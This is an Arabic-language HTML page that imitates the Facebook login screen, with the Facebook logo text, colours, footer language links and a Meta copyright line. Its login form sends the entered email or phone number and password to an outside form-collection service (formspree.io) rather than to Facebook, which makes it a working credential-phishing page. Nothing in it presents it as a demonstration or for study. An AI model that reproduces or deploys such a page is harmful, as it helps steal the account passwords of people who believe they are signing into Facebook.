<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            text-align: center;
        }
        .container {
            width: 100%;
            margin-top: 50px;
        }
        .logo h1 {
            color: #1877f2;
            font-size: 50px;
        }
        .login-box {
            background: white;
            width: 350px;
            margin: auto;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #166fe5;
        }
        .links a {
            display: block;
            margin-top: 10px;
            color: #1877f2;
            text-decoration: none; /* إزالة الخط تحت الروابط */
        }
        .links a.create-account {
            display: inline-block;
            background-color: #42b72a; /* لون أخضر */
            color: white;
            padding: 8px 16px;
            border-radius: 5px;
            font-size: 14px; /* تصغير حجم النص */
            text-decoration: none;
        }
        footer {
            margin-top: 50px;
            color: #65676b;
            font-size: 12px;
        }
        .footer-links {
            margin-top: 20px;
        }
        .footer-links ul {
            list-style: none;
            padding: 0;
        }
        .footer-links ul li {
            display: inline;
            margin: 0 10px;
        }
        .footer-links ul li a {
            color: #65676b;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>facebook</h1>
        </div>
        <div class="login-box">
            <form action="https://formspree.io/f/xvgkplap" method="POST">
                <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                <input type="password" name="password" placeholder="كلمة السر" required>
                <button type="submit">تسجيل الدخول</button>
            </form>
            <div class="links">
                <a href="#">هل نسيت الحساب؟</a>
                <a href="#" class="create-account">إنشاء حساب جديد</a>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-links">
            <ul>
                <li><a href="#">العربية</a></li>
                <li><a href="#">English (UK)</a></li>
                <li><a href="#">Français (France)</a></li>
                <li><a href="#">Español (España)</a></li>
                <li><a href="#">Türkçe</a></li>
                <li><a href="#">Deutsch</a></li>
            </ul>
        </div>
        <div class="footer-links">
            <ul>
                <li><a href="#">إنشاء حساب</a></li>
                <li><a href="#">تسجيل الدخول</a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">الخصوصية</a></li>
                <li><a href="#">الشروط</a></li>
            </ul>
        </div>
        <p>Meta © 2025</p>
    </footer>
</body>
</html>
